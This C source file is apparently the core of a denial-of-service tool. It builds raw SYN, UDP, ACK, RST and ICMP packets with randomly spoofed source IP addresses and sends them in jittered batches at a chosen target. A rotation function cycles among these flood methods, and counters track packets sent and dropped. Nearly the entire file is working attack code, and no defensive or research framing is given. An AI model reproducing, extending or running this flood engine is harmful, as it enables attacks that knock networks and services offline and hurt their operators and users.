#include "../include/engine.h"
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <stdio.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <netinet/ip_icmp.h>

static int g_advanced_sock = -1;
static int g_current_method = 0;
static int g_rotation_state = 0;
static int g_batch_size = 64;
static uint64_t g_packets_sent = 0;
static uint64_t g_packets_dropped = 0;
static unsigned int g_rand_state;
static char g_adv_err[256] = {0};

static int adv_xrand(void)
{
    g_rand_state = g_rand_state * 1103515245U + 12345U;
    return (int)(g_rand_state & 0x7FFFFFFF);
}

static void build_syn_packet(unsigned char *buf, int *len, struct sockaddr_in *dst, uint32_t spoof)
{
    struct iphdr *ip = (struct iphdr *)buf;
    struct tcphdr *tcp = (struct tcphdr *)(buf + sizeof(struct iphdr));
    int plen = sizeof(struct iphdr) + sizeof(struct tcphdr);

    memset(buf, 0, plen);
    ip->ihl = 5; ip->version = 4; ip->tot_len = htons(plen);
    ip->id = htons(adv_xrand() & 0xFFFF); ip->frag_off = htons(0x4000);
    ip->ttl = 64; ip->protocol = IPPROTO_TCP;
    ip->saddr = spoof; ip->daddr = dst->sin_addr.s_addr;
    ip->check = 0;
    { uint32_t s = 0; uint16_t *p = (uint16_t *)ip; for (int i = 0; i < 10; i++) s += p[i]; while (s >> 16) s = (s & 0xFFFF) + (s >> 16); ip->check = ~s & 0xFFFF; }

    tcp->source = htons((uint16_t)(1024 + (adv_xrand() % 64511)));
    tcp->dest = dst->sin_port;
    tcp->seq = (uint32_t)adv_xrand(); tcp->doff = 5; tcp->syn = 1; tcp->window = htons(65535);
    tcp->check = 0;
    { uint32_t s = 0; struct { uint32_t saddr; uint32_t daddr; uint8_t zero; uint8_t proto; uint16_t len; } ph;
      ph.saddr = ip->saddr; ph.daddr = ip->daddr; ph.zero = 0; ph.proto = IPPROTO_TCP; ph.len = htons(sizeof(struct tcphdr));
      uint16_t *p = (uint16_t *)&ph; for (int i = 0; i < 6; i++) s += p[i];
      p = (uint16_t *)tcp; for (int i = 0; i < (int)(sizeof(struct tcphdr) / 2); i++) s += p[i];
      while (s >> 16) s = (s & 0xFFFF) + (s >> 16); tcp->check = ~s & 0xFFFF; }
    *len = plen;
}

static void build_udp_packet(unsigned char *buf, int *len, struct sockaddr_in *dst, uint32_t spoof, int size)
{
    if (size < 1) size = 512; if (size > 4096) size = 4096;
    int plen = sizeof(struct iphdr) + sizeof(struct udphdr) + size;

    memset(buf, 0, plen);
    struct iphdr *ip = (struct iphdr *)buf;
    struct udphdr *udp = (struct udphdr *)(buf + sizeof(struct iphdr));

    ip->ihl = 5; ip->version = 4; ip->tot_len = htons(plen);
    ip->id = htons(adv_xrand() & 0xFFFF); ip->frag_off = htons(0x4000);
    ip->ttl = 64; ip->protocol = IPPROTO_UDP;
    ip->saddr = spoof; ip->daddr = dst->sin_addr.s_addr;
    ip->check = 0;
    { uint32_t s = 0; uint16_t *p = (uint16_t *)ip; for (int i = 0; i < 10; i++) s += p[i]; while (s >> 16) s = (s & 0xFFFF) + (s >> 16); ip->check = ~s & 0xFFFF; }

    udp->source = htons((uint16_t)(1024 + (adv_xrand() % 64511)));
    udp->dest = dst->sin_port;
    udp->len = htons(sizeof(struct udphdr) + size);
    unsigned char *payload = buf + sizeof(struct iphdr) + sizeof(struct udphdr);
    for (int i = 0; i < size; i++) payload[i] = (unsigned char)(adv_xrand() & 0xFF);
    *len = plen;
}

static void build_ack_packet(unsigned char *buf, int *len, struct sockaddr_in *dst, uint32_t spoof)
{
    struct iphdr *ip = (struct iphdr *)buf;
    struct tcphdr *tcp = (struct tcphdr *)(buf + sizeof(struct iphdr));
    int plen = sizeof(struct iphdr) + sizeof(struct tcphdr);

    memset(buf, 0, plen);
    ip->ihl = 5; ip->version = 4; ip->tot_len = htons(plen);
    ip->id = htons(adv_xrand() & 0xFFFF); ip->frag_off = htons(0x4000);
    ip->ttl = 64; ip->protocol = IPPROTO_TCP;
    ip->saddr = spoof; ip->daddr = dst->sin_addr.s_addr;
    ip->check = 0;
    { uint32_t s = 0; uint16_t *p = (uint16_t *)ip; for (int i = 0; i < 10; i++) s += p[i]; while (s >> 16) s = (s & 0xFFFF) + (s >> 16); ip->check = ~s & 0xFFFF; }

    tcp->source = htons((uint16_t)(1024 + (adv_xrand() % 64511)));
    tcp->dest = dst->sin_port;
    tcp->seq = (uint32_t)adv_xrand(); tcp->ack_seq = (uint32_t)adv_xrand(); tcp->doff = 5; tcp->ack = 1; tcp->window = htons(65535);
    tcp->check = 0;
    { uint32_t s = 0; struct { uint32_t saddr; uint32_t daddr; uint8_t zero; uint8_t proto; uint16_t len; } ph;
      ph.saddr = ip->saddr; ph.daddr = ip->daddr; ph.zero = 0; ph.proto = IPPROTO_TCP; ph.len = htons(sizeof(struct tcphdr));
      uint16_t *p = (uint16_t *)&ph; for (int i = 0; i < 6; i++) s += p[i];
      p = (uint16_t *)tcp; for (int i = 0; i < (int)(sizeof(struct tcphdr) / 2); i++) s += p[i];
      while (s >> 16) s = (s & 0xFFFF) + (s >> 16); tcp->check = ~s & 0xFFFF; }
    *len = plen;
}

static void build_icmp_packet(unsigned char *buf, int *len, struct sockaddr_in *dst, uint32_t spoof)
{
    int plen = sizeof(struct iphdr) + sizeof(struct icmphdr) + 56;

    memset(buf, 0, plen);
    struct iphdr *ip = (struct iphdr *)buf;
    struct icmphdr *icmp = (struct icmphdr *)(buf + sizeof(struct iphdr));

    ip->ihl = 5; ip->version = 4; ip->tot_len = htons(plen);
    ip->id = htons(adv_xrand() & 0xFFFF); ip->ttl = 64;
    ip->protocol = IPPROTO_ICMP; ip->saddr = spoof; ip->daddr = dst->sin_addr.s_addr;
    ip->check = 0;
    { uint32_t s = 0; uint16_t *p = (uint16_t *)ip; for (int i = 0; i < 10; i++) s += p[i]; while (s >> 16) s = (s & 0xFFFF) + (s >> 16); ip->check = ~s & 0xFFFF; }

    icmp->type = ICMP_ECHO; icmp->code = 0;
    icmp->checksum = 0;
    { uint32_t s = 0; uint16_t *p = (uint16_t *)icmp; for (int i = 0; i < (int)((sizeof(struct icmphdr) + 56) / 2); i++) s += p[i]; while (s >> 16) s = (s & 0xFFFF) + (s >> 16); icmp->checksum = ~s & 0xFFFF; }
    *len = plen;
}

static int adv_send_pkt(unsigned char *buf, int len, struct sockaddr_in *dst)
{
    int ret = (int)sendto(g_advanced_sock, buf, (size_t)len, 0, (struct sockaddr *)dst, sizeof(struct sockaddr_in));
    if (ret > 0) {
        __sync_fetch_and_add(&g_packets_sent, 1);
        return 1;
    }
    __sync_fetch_and_add(&g_packets_dropped, 1);
    return 0;
}

EXPORT int init_advanced_engine(int sock, int method)
{
    g_advanced_sock = sock;
    g_current_method = method;
    g_rotation_state = 0;
    g_packets_sent = 0;
    g_packets_dropped = 0;
    g_batch_size = 64;
    g_rand_state = (unsigned int)(time(NULL) ^ (uintptr_t)&g_advanced_sock);
    if (g_advanced_sock < 0) {
        snprintf(g_adv_err, sizeof(g_adv_err), "invalid socket");
        return -1;
    }
    return 0;
}

EXPORT int advanced_send_batch(int sock, struct sockaddr_in *dst, int count, int method)
{
    if (!dst || count <= 0 || sock < 0) {
        snprintf(g_adv_err, sizeof(g_adv_err), "invalid arguments");
        return -1;
    }
    if (g_advanced_sock != sock) {
        g_advanced_sock = sock;
    }

    uint32_t spoof = (uint32_t)(adv_xrand() | ((uint32_t)adv_xrand() << 16));
    int sent = 0;
    unsigned char buf[4096];
    int pkt_len = 0;

    for (int i = 0; i < count; i++) {
        spoof = (uint32_t)(adv_xrand() | ((uint32_t)adv_xrand() << 16));

        switch (method) {
        case METHOD_SYN:
            build_syn_packet(buf, &pkt_len, dst, spoof);
            break;
        case METHOD_UDP:
            build_udp_packet(buf, &pkt_len, dst, spoof, 512 + (adv_xrand() % 1024));
            break;
        case METHOD_ACK:
            build_ack_packet(buf, &pkt_len, dst, spoof);
            break;
        case METHOD_RST:
            build_syn_packet(buf, &pkt_len, dst, spoof);
            if (pkt_len > 0) {
                struct tcphdr *tcp = (struct tcphdr *)(buf + sizeof(struct iphdr));
                tcp->syn = 0; tcp->rst = 1;
            }
            break;
        case METHOD_ICMP:
            build_icmp_packet(buf, &pkt_len, dst, spoof);
            break;
        default:
            build_syn_packet(buf, &pkt_len, dst, spoof);
            break;
        }

        sent += adv_send_pkt(buf, pkt_len, dst);

        int jitter = adv_xrand() % 100;
        if (jitter > 10 && i < count - 1) {
            usleep((unsigned int)(jitter));
        }
    }

    return sent;
}

EXPORT int strategy_rotate(void)
{
    int methods[] = {METHOD_SYN, METHOD_UDP, METHOD_ACK, METHOD_RST, METHOD_ICMP};
    int n = sizeof(methods) / sizeof(methods[0]);

    g_rotation_state = (g_rotation_state + 1) % (n * 10);
    int idx = g_rotation_state / 10;
    if (idx >= n) idx = n - 1;

    g_current_method = methods[idx];
    return g_current_method;
}

EXPORT void get_engine_stats(uint64_t *sent, uint64_t *dropped)
{
    if (sent) *sent = __sync_add_and_fetch(&g_packets_sent, 0);
    if (dropped) *dropped = __sync_add_and_fetch(&g_packets_dropped, 0);
}
